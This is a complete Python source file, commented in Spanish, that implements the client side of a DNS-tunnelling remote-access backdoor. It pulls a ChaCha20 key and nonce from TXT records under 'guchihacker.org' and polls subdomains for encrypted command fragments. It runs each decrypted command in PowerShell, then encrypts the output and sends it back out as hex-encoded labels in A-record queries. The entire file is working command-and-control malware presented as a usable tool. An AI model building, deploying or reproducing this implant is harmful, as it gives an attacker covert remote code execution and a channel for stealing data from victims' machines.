import socket
import base64
import sys
import re
import subprocess
import time
from dnslib import DNSRecord, DNSQuestion, QTYPE
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

# Configuración
DOMINIO_BASE = "guchihacker.org"
CMD_SUBDOMINIO = f"cmd.{DOMINIO_BASE}"
OUTPUT_SUBDOMINIO = f"output.{DOMINIO_BASE}"
CIPHER_SUBDOMINIO = f"cipher.{DOMINIO_BASE}"
MAX_FRAGS = 100
MAX_LABEL_LEN = 63

# Delays de configuración (en segundos)
DELAY_CHECK_COMANDO = 1.0     # Tiempo entre comprobaciones de nuevos comandos
DELAY_RESPUESTA = 0.5        # Tiempo entre envíos de fragmentos de respuesta

# --- Utilidades ---
def hex_encode_utf8(s):
    if isinstance(s, str):
        return s.encode("utf-8").hex()
    return s.hex()

def hex_decode_utf8(s):
    try:
        return bytes.fromhex(s)
    except ValueError as e:
        print(f"[ERROR DECODIFICANDO HEX]: {e}")
        return None

def dns_query(name, qtype='TXT'):
    try:
        # Crear la consulta DNS usando DNSQuestion
        qtype_value = getattr(QTYPE, qtype)
        request = DNSRecord(q=DNSQuestion(name, qtype_value))
        try:
            data = request.send('127.0.0.1', 53, timeout=5)
            if data:
                d = DNSRecord.parse(data)
                if d.rr:
                    rdata = d.rr[0].rdata
                    if qtype == 'TXT':
                        # La respuesta TXT viene como un string con comillas
                        txt_data = str(rdata).strip('"')
                        return txt_data
                    elif qtype == 'A':
                        # Para respuestas A, convertimos la IP a hex
                        ip = str(rdata)
                        # Convertimos cada octeto a hex y lo juntamos
                        hex_str = ''.join([hex(int(x))[2:].zfill(2) for x in ip.split('.')])
                        return hex_str
                    return str(rdata)
        except socket.timeout:
            print("[ERROR] Timeout al conectar con el servidor DNS")
        except socket.error as e:
            print(f"[ERROR] Error de socket al conectar: {e}")
    except Exception as e:
        print(f"[ERROR DNS]: {e}")
    return None

def get_cipher_info():
    key = None
    nonce = None
    print("[*] Obteniendo información de cifrado...")
    for i in range(1, 3):
        query = f"{str(i)}.{CIPHER_SUBDOMINIO}"
        txt = dns_query(query, "TXT")
        if not txt:
            continue
        if i == 1:
            if txt.startswith('total-2-'):
                try:
                    hex_key = txt.split('-', 2)[2]
                    key = hex_decode_utf8(hex_key)
                    if key is None:
                        print('[ERROR] No se pudo decodificar la clave')
                        sys.exit(1)
                except Exception as e:
                    print(f"[ERROR] Decodificando clave: {e}")
                    sys.exit(1)
        else:
            try:
                nonce = hex_decode_utf8(txt)
                if nonce is None:
                    print('[ERROR] No se pudo decodificar el nonce')
                    sys.exit(1)
            except Exception as e:
                print(f"[ERROR DECODIFICANDO HEX]: {e}")
                sys.exit(1)
    
    if key is None or nonce is None:
        print("[ERROR] No se pudo obtener clave o nonce")
        sys.exit(1)
    
    print("[+] Información de cifrado obtenida correctamente")
    return key, nonce

def get_command_fragments():
    frags = []
    for i in range(1, MAX_FRAGS + 1):
        # Convertir el índice a string
        query = f"{str(i)}.{CMD_SUBDOMINIO}"
        txt = dns_query(query)
        if not txt:
            if i == 1:  # Si no hay primer fragmento, no hay comando
                continue
            else:  # Si no hay más fragmentos después del primero, terminamos
                break
        frags.append(txt)
        if txt.startswith('total-'):
            try:
                _, num, _ = txt.split('-', 2)
                if len(frags) >= int(num):
                    break
            except Exception as e:
                print(f"[ERROR] Formato inválido en fragmento total: {e}")
                break
    return frags

def decrypt_command(frags, cipher, nonce):
    if not frags:
        return ""
    lista_ordenada = [""] * len(frags)
    total = len(frags)
    for frag in frags:
        if frag.startswith("total-"):
            try:
                _, num, real = frag.split("-", 2)
                total = int(num)
                lista_ordenada = [""] * total
                lista_ordenada[0] = real
            except Exception as e:
                print(f"[ERROR] Formato inválido en fragmento total: {e}")
                return ""
        else:
            idx = len([x for x in lista_ordenada if x])
            if idx < len(lista_ordenada):
                lista_ordenada[idx] = frag
    
    hex_str = ''.join(lista_ordenada)
    try:
        ciphertext = hex_decode_utf8(hex_str)
        if ciphertext is None:
            return ""
        return cipher.decrypt(nonce, ciphertext, None).decode('utf-8', errors='replace')
    except Exception as e:
        print(f"[ERROR] Decodificando comando: {e}")
        return ""

def run_powershell(cmd):
    try:
        output = subprocess.check_output(['powershell', '-Command', cmd], stderr=subprocess.STDOUT)
        return output.decode('utf-8', errors='replace')
    except subprocess.CalledProcessError as e:
        return f"Error (código {e.returncode}): {e.output.decode('utf-8', errors='replace')}"
    except Exception as e:
        return f"Error ejecutando comando: {e}"

def fragmentar_mensaje_nuevo(mensaje, max_len, cipher, nonce):
    try:
        ciphertext = cipher.encrypt(nonce, mensaje.encode('utf-8'), None)
        hex_str = hex_encode_utf8(ciphertext)
        partes = [hex_str[i:i+max_len] for i in range(0, len(hex_str), max_len)]
        if len(partes) > 1:
            partes[0] = f"total-{len(partes)}-{partes[0]}"
        return partes
    except Exception as e:
        print(f"[ERROR] Fragmentando mensaje: {e}")
        return []

def send_output_fragments(fragments):
    if not fragments:
        return
    
    print(f"[INFO] Enviando respuesta en {len(fragments)} tramas...")
    
    # Primer fragmento con el total
    total = len(fragments)
    query = f"data-{total}-{fragments[0]}.1.{OUTPUT_SUBDOMINIO}"
    dns_query(query, 'A')
    time.sleep(DELAY_RESPUESTA)  # Delay entre fragmentos de respuesta
    
    # Resto de fragmentos
    for i, frag in enumerate(fragments[1:], 2):
        query = f"{frag}.{i}.{OUTPUT_SUBDOMINIO}"
        dns_query(query, 'A')
        time.sleep(DELAY_RESPUESTA)  # Delay entre fragmentos de respuesta
    
    print(f"[INFO] Respuesta enviada completamente ({len(fragments)} tramas)")

if __name__ == '__main__':
    key, nonce = get_cipher_info()
    if not key or not nonce:
        sys.exit(1)
    cipher = ChaCha20Poly1305(key)
    
    last_cmd = None
    while True:
        frags = get_command_fragments()
        if not frags:
            time.sleep(DELAY_CHECK_COMANDO)  # Delay para comprobar nuevos comandos
            continue
        
        cmd = decrypt_command(frags, cipher, nonce)
        if not cmd.strip():
            time.sleep(DELAY_CHECK_COMANDO)  # Delay para comprobar nuevos comandos
            continue
        
        # Evitar ejecutar el mismo comando múltiples veces
        if cmd == last_cmd:
            time.sleep(DELAY_CHECK_COMANDO)  # Delay para comprobar nuevos comandos
            continue
        
        last_cmd = cmd
        print(f'[COMMAND]: {cmd}')
        
        if cmd.strip().lower() == 'exit':
            print('[INFO]: Comando de salida recibido. Cerrando cliente.')
            out_frags = fragmentar_mensaje_nuevo('__EXIT__', MAX_LABEL_LEN-20, cipher, nonce)
            send_output_fragments(out_frags)
            sys.exit(0)
        
        output = run_powershell(cmd)
        print(f'[OUTPUT]:\n{output}')
        out_frags = fragmentar_mensaje_nuevo(output, MAX_LABEL_LEN-20, cipher, nonce)
        send_output_fragments(out_frags)
        time.sleep(DELAY_CHECK_COMANDO)  # Delay antes de comprobar el siguiente comando 